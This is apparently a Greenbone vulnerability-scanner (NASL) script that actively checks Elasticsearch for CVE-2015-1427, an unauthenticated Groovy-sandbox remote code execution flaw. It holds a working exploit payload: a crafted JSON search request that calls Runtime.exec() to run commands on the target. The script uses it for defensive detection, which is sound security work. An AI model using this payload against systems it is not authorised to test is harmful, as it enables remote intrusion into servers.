# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:elastic:elasticsearch";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105233");
  script_version("2025-09-03T08:26:15+0000");
  script_tag(name:"last_modification", value:"2025-09-03 08:26:15 +0000 (Wed, 03 Sep 2025)");
  script_tag(name:"creation_date", value:"2015-03-12 10:52:20 +0100 (Thu, 12 Mar 2015)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-07-16 17:56:22 +0000 (Tue, 16 Jul 2024)");
  script_cve_id("CVE-2015-1427");
  script_name("Elastic Elasticsearch < 1.3.8, 1.4.x < 1.4.3 Groovy Scripting Engine Unauthenticated RCE Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("gb_elastic_elasticsearch_consolidation.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 9200);
  script_mandatory_keys("elastic/elasticsearch/http/detected");

  script_xref(name:"URL", value:"https://web.archive.org/web/20240815055759/https://www.elastic.co/blog/elasticsearch-1-4-3-and-1-3-8-released");
  script_xref(name:"URL", value:"https://discuss.elastic.co/t/elasticsearch-1-4-3-and-1-3-8-release-including-cve/22123");
  script_xref(name:"URL", value:"https://www.trendmicro.com/en_us/research/19/g/multistage-attack-delivers-billgates-setag-backdoor-can-turn-elasticsearch-databases-into-ddos-botnet-zombies.html");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210506011817/http://www.securityfocus.com/bid/72585");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  script_tag(name:"summary", value:"Elastic Elasticsearch is prone to an unauthenticated remote code
  execution (RCE).");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The Groovy scripting engine in Elastic Elasticsearch allows
  remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands
  via a crafted script.

  This vulnerability was known to be used by the Setag/BillGates malware in 2019.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to bypass certain security
  restrictions and execute code in the context of this application.");

  script_tag(name:"affected", value:"Elastic Elasticsearch versions prior to 1.3.8 and 1.4.x prior
  to 1.4.3.");

  script_tag(name:"solution", value:"Update to version 1.3.8, 1.4.3 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( isnull( port = get_app_port( cpe:CPE, service:"www" ) ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

cmds = exploit_commands();

url = "/_search?pretty";

foreach cmd( keys( cmds ) ) {

  ex = '{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"' + cmds[ cmd ]  +  '\\").getText()"}}}';
  req = http_post( item:url, port:port, data:ex );
  res = http_keepalive_send_recv( port:port, data:req );

  if( res && eregmatch( pattern:cmd, string:res ) ) {
    report  = http_report_vuln_url( port:port, url:url );
    report += '\nPOST body: ' + ex;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
